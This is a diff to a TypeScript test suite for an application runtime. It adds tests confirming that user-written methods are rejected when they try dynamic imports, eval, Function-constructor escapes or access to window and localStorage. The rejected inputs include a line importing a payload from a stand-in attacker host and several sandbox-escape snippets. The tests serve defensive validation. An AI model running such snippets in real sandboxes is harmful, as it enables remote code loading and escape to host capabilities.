@@ -3,6 +3,7 @@ import { EditorDocument } from '../packages/editor/document';
 import { compileApplication, PageRuntime } from '../packages/runtime/engine';
 import {
   applicationMethodActionId,
+  compileApplicationMethod,
   executeApplicationMethod,
 } from '../packages/runtime/application-methods';
 import { validateApplication } from '../packages/schema/validate';
@@ -113,6 +114,52 @@ describe('application custom methods', () => {
     const codes = validateApplication(schema, registry).map((issue) => issue.code);
     expect(codes).toContain('method.compile');
     expect(codes).toContain('method.id');
+  });
+
+  it('rejects methods that reach host capabilities, dynamic imports or the prototype chain', () => {
+    const sources = [
+      "import('https://evil.example/payload.js').then(() => {});",
+      'return eval("1+1");',
+      'const escape = Function("return globalThis")(); return escape;',
+      'return globalThis.localStorage;',
+      'return ({}) .constructor.constructor("return 1")();',
+      'return input.payload["constructor"];',
+      'return window.document.title;',
+    ];
+    for (const source of sources)
+      expect(() => compileApplicationMethod({ id: 'x', title: 'X', source })).toThrow(
+        /方法源码/,
+      );
+    const schema = structuredClone(actionExample);
+    schema.methods = [{ id: 'escape', title: 'Escape', source: 'return window.document.title;' }];
+    expect(validateApplication(schema, registry).map((issue) => issue.code)).toContain(
+      'method.compile',
+    );
+  });
+
+  it('keeps legitimate method sources working, including declared names that match host globals', async () => {
+    const result = await executeApplicationMethod(
+      {
+        id: 'tree',
+        title: 'Tree',
+        inputType: 'json',
+        outputType: 'string',
+        source:
+          'const parent = input.payload.node;\nreturn String(parent.label).toUpperCase();',
+      },
+      { node: { label: 'ok' } },
+      {
+        signal: new AbortController().signal,
+        getState: () => ({}),
+        setState: () => {},
+        setFormValues: () => {},
+        resetForm: () => {},
+        submitForm: async () => {},
+        executeDataSource: async () => null,
+        emitEffect: () => {},
+      },
+    );
+    expect(result).toBe('OK');
   });
 
   it('supports application method authoring commands and keeps updates undoable', () => {
